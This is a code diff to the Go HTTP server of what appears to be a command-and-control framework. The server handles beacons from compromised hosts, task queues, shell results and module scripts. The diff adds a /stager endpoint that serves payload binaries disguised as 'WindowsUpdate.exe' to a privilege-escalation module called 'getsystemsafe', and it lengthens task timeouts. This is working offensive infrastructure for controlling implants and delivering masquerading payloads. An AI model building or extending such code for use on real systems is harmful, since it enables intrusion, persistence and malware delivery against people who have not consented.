@@ -28,12 +28,13 @@ type Server struct {
 		Debug(string, ...interface{})
 		Error(string, ...interface{})
 	}
-	sessions     map[string]*Session
-	sessionsMu   sync.RWMutex
-	handler      *http.ServeMux
-	server       *http.Server
-	taskQueue    *tasks.Queue
-	moduleGetter func(string, map[string]string) (string, error) // Function to get module script by ID with optional params
+	sessions      map[string]*Session
+	sessionsMu    sync.RWMutex
+	handler       *http.ServeMux
+	server        *http.Server
+	taskQueue     *tasks.Queue
+	moduleGetter  func(string, map[string]string) (string, error) // Function to get module script by ID with optional params
+	stagerGetter  func(string) ([]byte, error)                    // Function to get stager payload by callback URL
 }
 
 // Session represents a client session
@@ -101,6 +102,9 @@ func (s *Server) setupRoutes() {
 
 	// Module endpoint
 	s.handler.HandleFunc("/module/", s.handleModule)
+
+	// Stager endpoint - serves payloads for download (used by getsystemsafe)
+	s.handler.HandleFunc("/stager", s.handleStager)
 
 	// Health check
 	s.handler.HandleFunc("/health", s.handleHealth)
@@ -273,7 +277,7 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		}
 		s.sessions[sessionID] = session
 		newSessionCreated = true
-		s.logger.Info("[SESSION] New session created: %s from %s", shortSessionID(sessionID), r.RemoteAddr)
+		s.logger.Info("[SESSION] New session created: %s from %s", ShortSessionID(sessionID), r.RemoteAddr)
 		s.logger.Debug("Total active sessions: %d", len(s.sessions))
 	} else {
 		// Existing session - update LastSeen
@@ -283,7 +287,7 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 			s.logger.Debug("Session %s RemoteAddr changed: %s -> %s", sessionID, session.RemoteAddr, r.RemoteAddr)
 			session.RemoteAddr = r.RemoteAddr
 		}
-		s.logger.Debug("[SESSION] Existing session updated: %s (last seen: %v)", shortSessionID(sessionID), session.LastSeen)
+		s.logger.Debug("[SESSION] Existing session updated: %s (last seen: %v)", ShortSessionID(sessionID), session.LastSeen)
 	}
 	s.sessionsMu.Unlock()
 
@@ -356,7 +360,7 @@ func (s *Server) handleModule(w http.ResponseWriter, r *http.Request) {
 	sessionID := r.Header.Get("X-Session-ID")
 
 	s.logger.Info("[MODULE] Session %s fetching module: %s (task: %s)", 
-		shortSessionID(sessionID), moduleID, taskID)
+				ShortSessionID(sessionID), moduleID, taskID)
 	s.logger.Debug("Module request for %s (task: %s, session: %s) from %s", moduleID, taskID, sessionID, r.RemoteAddr)
 
 	if s.moduleGetter == nil {
@@ -408,7 +412,7 @@ func (s *Server) handleModule(w http.ResponseWriter, r *http.Request) {
 	}
 
 	s.logger.Info("[MODULE] Module script sent: %s (task: %s, session: %s)", 
-		moduleID, taskID, shortSessionID(sessionID))
+		moduleID, taskID, ShortSessionID(sessionID))
 	s.logger.Debug("Module script sent for %s", moduleID)
 }
 
@@ -425,17 +429,18 @@ func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
 	tasks := s.getPendingTasks(sessionID)
 	s.logger.Debug("Retrieved %d pending tasks for session %s", len(tasks), sessionID)
 
-	// Mark tasks as in-progress and schedule removal
+	// Mark tasks as in-progress and schedule removal for stuck tasks
 	for _, taskMap := range tasks {
 		if taskID, ok := taskMap["id"].(string); ok {
 			s.logger.Debug("Marking task %s as in_progress for session %s", taskID, sessionID)
 			if s.taskQueue != nil {
 				s.taskQueue.UpdateStatus(taskID, "in_progress")
-				// Remove task after completion timeout (30 seconds)
+				// Remove task if it's been stuck in progress for too long (10 minutes)
+				// This prevents memory leaks from tasks that never complete
 				go func(id string) {
-					time.Sleep(30 * time.Second)
+					time.Sleep(10 * time.Minute)
 					if task := s.taskQueue.Get(id); task != nil && task.Status == "in_progress" {
-						s.logger.Debug("Removing expired task %s after timeout", id)
+						s.logger.Debug("Removing stuck task %s after 10 minute timeout", id)
 						s.taskQueue.Remove(id)
 					}
 				}(taskID)
@@ -487,10 +492,10 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
 		
 		if moduleID != "" {
 			s.logger.Info("[MODULE] Session %s completed module: %s (task: %s)", 
-				shortSessionID(sessionID), moduleID, taskID)
+				ShortSessionID(sessionID), moduleID, taskID)
 		} else {
 			s.logger.Info("[MODULE] Session %s completed module execution (task: %s)", 
-				shortSessionID(sessionID), taskID)
+				ShortSessionID(sessionID), taskID)
 		}
 		
 		// Log result preview (first 200 chars)
@@ -503,10 +508,10 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
 		}
 	} else if taskType == "shell" {
 		s.logger.Info("[SHELL] Session %s completed command execution (task: %s)", 
-			shortSessionID(sessionID), taskID)
+			ShortSessionID(sessionID), taskID)
 	} else {
 		s.logger.Info("[TASK] Session %s completed task (type: %s, task: %s)", 
-			shortSessionID(sessionID), taskType, taskID)
+			ShortSessionID(sessionID), taskType, taskID)
 	}
 
 	// Update task status and remove after completion
@@ -514,9 +519,9 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
 		if s.taskQueue != nil {
 			s.taskQueue.SetResult(taskID, result)
 			s.logger.Debug("Task %s result stored, scheduling removal", taskID)
-			// Remove task after a longer delay to allow result processing (60 seconds for async checking)
+			// Remove task after a longer delay to allow result processing (5 minutes for async checking)
 			go func() {
-				time.Sleep(60 * time.Second)
+				time.Sleep(5 * time.Minute)
 				s.taskQueue.Remove(taskID)
 				s.logger.Debug("Task %s removed after result processing", taskID)
 			}()
@@ -535,6 +540,55 @@ func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
 	if _, err := w.Write([]byte("OK")); err != nil {
 		s.logger.Error("Failed to write health check response: %v", err)
 	}
+}
+
+// handleStager serves payload binaries for download (used by getsystemsafe)
+func (s *Server) handleStager(w http.ResponseWriter, r *http.Request) {
+	s.logger.Debug("Stager request from %s", r.RemoteAddr)
+	
+	// Get callback URL from request (could be in query param or header)
+	callbackURL := r.URL.Query().Get("callback")
+	if callbackURL == "" {
+		callbackURL = r.Header.Get("X-Callback-URL")
+	}
+	if callbackURL == "" {
+		// Try to infer from request
+		scheme := "http"
+		if r.TLS != nil {
+			scheme = "https"
+		}
+		callbackURL = fmt.Sprintf("%s://%s", scheme, r.Host)
+	}
+	
+	// If we have a stager getter, use it
+	if s.stagerGetter != nil {
+		payload, err := s.stagerGetter(callbackURL)
+		if err != nil {
+			s.logger.Error("Failed to generate stager: %v", err)
+			http.Error(w, "Failed to generate stager", http.StatusInternalServerError)
+			return
+		}
+		
+		// Set headers for binary download
+		w.Header().Set("Content-Type", "application/octet-stream")
+		w.Header().Set("Content-Disposition", "attachment; filename=WindowsUpdate.exe")
+		w.Header().Set("Content-Length", fmt.Sprintf("%d", len(payload)))
+		w.WriteHeader(http.StatusOK)
+		
+		if _, err := w.Write(payload); err != nil {
+			s.logger.Error("Failed to write stager response: %v", err)
+		}
+		s.logger.Info("Served stager payload (%d bytes) to %s", len(payload), r.RemoteAddr)
+		return
+	}
+	
+	// Fallback: return a simple error
+	http.Error(w, "Stager generation not configured", http.StatusNotImplemented)
+}
+
+// SetStagerGetter sets the function to generate stager payloads
+func (s *Server) SetStagerGetter(getter func(string) ([]byte, error)) {
+	s.stagerGetter = getter
 }
 
 func (s *Server) getPendingTasks(sessionID string) []map[string]interface{} {
@@ -576,8 +630,8 @@ func generateSessionID() string {
 	return strings.ToLower(encoded[:8]) // Use first 8 characters
 }
 
-// shortSessionID returns a shortened version of session ID for logging
-func shortSessionID(id string) string {
+// ShortSessionID returns a shortened version of session ID for logging
+func ShortSessionID(id string) string {
 	if len(id) <= 8 {
 		return id
 	}
